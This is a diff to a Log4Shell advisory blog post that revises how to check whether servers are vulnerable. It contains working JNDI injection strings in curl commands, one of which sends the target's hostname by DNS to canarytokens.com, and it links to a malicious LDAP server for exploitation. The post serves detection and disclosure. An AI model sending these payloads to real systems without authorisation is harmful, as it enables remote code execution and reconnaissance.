@@ -35,7 +35,7 @@ _Updated @ December 11th, 7:30pm PST_
 
 _This blog post is also available at https://log4shell.com/_
 
-A few hours ago, a 0-day exploit in the
+On Thursday (December 9th), a 0-day exploit in the
 popular Java logging library `log4j` (version 2) was discovered that results in Remote Code Execution (RCE) by
 logging a certain string.
 
@@ -159,7 +159,7 @@ docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
 and in another:
 
 ```shell
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}'
+curl 127.0.0.1:8080 -H 'User-Agent: ${jndi:ldap://127.0.0.1/a}'
 ```
 
 the logs should include an error message indicating that a remote lookup was attempted but failed:
@@ -180,25 +180,26 @@ Due to how common Java vulnerabilities such as these are, security researchers h
 them. The [marshalsec](https://github.com/mbechler/marshalsec) project is one of many that demonstrates generating an
 exploit payload that could be used for this vulnerability. You can refer to [this malicious LDAP server](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java) for an example of exploitation.
 
-## How to identify if your server is vulnerable.
+## How to identify vulnerable remote servers
 
-Using a DNS logger (such as [dnslog.cn](http://www.dnslog.cn/)), you can generate a domain name and use this in your test
-payloads:
+Make sure that you have permission from the owner of the server to be penetration tested.  
+
+The simplest way to detect if a remote endpoint is vulnerable is to trigger a DNS query. As explained above,
+the exploit will cause the vulnerable server to attempt to fetch some remote code.  By using the address
+of a free online DNS logging tool in the exploit string, we can detect when the vulnerability is triggered.  
+
+[CanaryTokens.org](https://canarytokens.org/generate#) is an Open Source web app for this purpose that even generates the exploit string automatically 
+and sends an email notification when the DNS is queried.  Select `Log4Shell` from the drop-down menu. Then, embed the string 
+in a request field that you expect the server to log.  This could be an anything from a form
+input to an HTTP header.  In our example above, the User-Agent header was being logged. This request should trigger it:
 
 ```shell
-curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.<RANDOM_STRING>.canarytokens.com/a}'
 ```
 
-Refreshing the page will show DNS queries which identify hosts who have triggered the vulnerability.
-
 :::caution
-
-While _dnslog.cn_ has become popular for testing log4shell, we advise caution. When testing sensitive infrastructure,
-information sent to this site could be used by its owner to catalogue and later exploit it.
-
 If you wish to test more discretely, you may [setup your own authoritative DNS server](https://www.joshmcguigan.com/blog/run-your-own-dns-servers/)
 for testing.
-
 :::
 
 ## More information
